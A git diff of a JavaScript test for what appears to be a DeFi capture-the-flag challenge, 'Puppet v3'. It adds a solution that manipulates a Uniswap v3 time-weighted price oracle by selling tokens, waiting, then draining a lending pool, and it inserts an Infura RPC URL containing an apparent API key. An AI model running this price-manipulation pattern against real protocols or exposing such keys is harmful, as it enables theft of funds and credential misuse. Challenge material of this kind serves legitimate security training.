@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/becb033f3bc54e01b6213b3a4f7665a3";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -139,7 +139,16 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // There is not much liquidity on Uniswap
+        // We can sell all our tokens on Uniswap to manipulate the price
+        // Then we can borrow all the tokens from the lending pool with a small collateral
+        // Difference from V2 is that now the price is time averaged
+        // So we have to wait some time after selling the tokens
+        attacker = await (await ethers.getContractFactory('PuppetV3Attacker', player)).deploy(lendingPool.address);
+        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attacker.sellTokens();
+        await time.increase(110);
+        await attacker.borrowTokens();
     });
 
     after(async function () {
